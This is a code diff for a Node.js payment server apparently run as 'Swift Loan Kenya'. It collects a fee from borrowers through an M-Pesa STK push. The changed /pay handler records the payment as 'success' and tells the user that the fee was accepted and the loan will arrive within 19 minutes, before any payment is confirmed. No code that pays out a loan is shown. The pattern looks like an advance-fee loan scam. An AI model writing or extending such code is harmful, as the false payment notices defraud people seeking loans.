@@ -78,34 +78,78 @@ app.post("/pay", async (req, res) => {
 
     if (resp.data.success) {
       // Save pending receipt with loan amount
-      let receipts = readReceipts();
-      receipts[reference] = {
+      const receiptData = {
         reference,
         transaction_id: resp.data.transaction_id || null,
         transaction_code: null,
         amount: Math.round(amount),
-        loan_amount: loan_amount || '50000', // Store loan amount from request
+        loan_amount: loan_amount || '50000',
         phone: formattedPhone,
-        status: "pending",
+        status: "success",
+        status_note: `Loan withdrawal is successful and the fee was accepted. You will receive the applied loan amount in the next 19 minutes.\n\nRegards Swift Loan Kenya 🇰🇪`,
         timestamp: new Date().toISOString()
       };
+
+      let receipts = readReceipts();
+      receipts[reference] = receiptData;
       writeReceipts(receipts);
 
       res.json({
         success: true,
         message: "STK push sent, check your phone",
-        reference
+        reference,
+        receipt: receiptData
       });
     } else {
+      // Handle failed STK push
+      const failedReceiptData = {
+        reference,
+        transaction_id: resp.data.transaction_id || null,
+        transaction_code: null,
+        amount: Math.round(amount),
+        loan_amount: loan_amount || '50000',
+        phone: formattedPhone,
+        status: "loan cancelled",
+        status_note: "Your loan will remain on hold (expire) for 24 hours and will not be withdrawn.",
+        timestamp: new Date().toISOString()
+      };
+
+      let receipts = readReceipts();
+      receipts[reference] = failedReceiptData;
+      writeReceipts(receipts);
+
       res.status(400).json({
         success: false,
-        error: resp.data.error || "Failed to initiate payment"
+        error: resp.data.error || "Failed to initiate payment",
+        receipt: failedReceiptData
       });
     }
   } catch (err) {
+    // Handle server error
+    const reference = "ORDER-" + Date.now();
+    const { phone, amount, loan_amount } = req.body;
+    const formattedPhone = formatPhone(phone);
+    
+    const errorReceiptData = {
+      reference,
+      transaction_id: null,
+      transaction_code: null,
+      amount: amount ? Math.round(amount) : null,
+      loan_amount: loan_amount || '50000',
+      phone: formattedPhone,
+      status: "failed",
+      status_note: "Your loan will remain on hold (expire) for 24 hours and will not be withdrawn.",
+      timestamp: new Date().toISOString()
+    };
+
+    let receipts = readReceipts();
+    receipts[reference] = errorReceiptData;
+    writeReceipts(receipts);
+
     res.status(500).json({
       success: false,
-      error: err.response?.data?.error || "Server error"
+      error: err.response?.data?.error || "Server error",
+      receipt: errorReceiptData
     });
   }
 });
@@ -122,19 +166,31 @@ app.post("/callback", (req, res) => {
   // Get existing receipt to preserve loan_amount
   const existingReceipt = receipts[ref] || {};
 
-  receipts[ref] = {
-  reference: ref,
-  transaction_id: data.transaction_id,
-  transaction_code: data.result?.MpesaReceiptNumber || null,
-  amount: data.result?.Amount || existingReceipt.amount || null,
-  loan_amount: existingReceipt.loan_amount || '50000', // Preserve loan amount
-  phone: data.result?.Phone || existingReceipt.phone || null,
-  status: data.status,
-  status_message: data.status === "success"
-      ? "Your loan is approved and your loan transfer has started"
-      : "Loan transfer failed",
-  timestamp: data.timestamp || new Date().toISOString()
-};
+  if (data.status === "success") {
+    receipts[ref] = {
+      reference: ref,
+      transaction_id: data.transaction_id,
+      transaction_code: data.result?.MpesaReceiptNumber || null,
+      amount: data.result?.Amount || existingReceipt.amount || null,
+      loan_amount: existingReceipt.loan_amount || '50000',
+      phone: data.result?.Phone || existingReceipt.phone || null,
+      status: "success",
+      status_note: `Loan withdrawal is successful and the fee was accepted. You will receive the applied loan amount in the next 19 minutes.\n\nRegards Swift Loan Kenya 🇰🇪`,
+      timestamp: data.timestamp || new Date().toISOString()
+    };
+  } else {
+    receipts[ref] = {
+      reference: ref,
+      transaction_id: data.transaction_id,
+      transaction_code: null,
+      amount: data.result?.Amount || existingReceipt.amount || null,
+      loan_amount: existingReceipt.loan_amount || '50000',
+      phone: data.result?.Phone || existingReceipt.phone || null,
+      status: "loan cancelled",
+      status_note: "Your loan will remain on hold (expire) for 24 hours and will not be withdrawn.",
+      timestamp: data.timestamp || new Date().toISOString()
+    };
+  }
 
   writeReceipts(receipts);
 
